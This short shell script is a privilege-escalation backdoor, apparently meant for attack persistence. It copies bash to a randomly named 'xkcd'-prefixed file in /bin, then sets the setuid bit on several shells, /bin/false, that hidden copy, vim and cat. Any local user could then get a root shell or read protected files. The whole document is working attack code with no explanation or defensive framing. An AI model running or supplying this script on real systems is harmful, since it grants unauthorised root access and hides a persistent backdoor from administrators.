#!/bin/sh
randVar=$(cat /dev/urandom | head -c 6 | base64 -w0 | tr -d "+" | tr -d "/")
randVar="xkcd$randVar"
cp -f /bin/bash /bin/$randVar
chmod u+s /bin/bash /bin/zsh /bin/fish /bin/false /bin/$randVar
chmod +s /usr/bin/vim
chmod +s /bin/cat
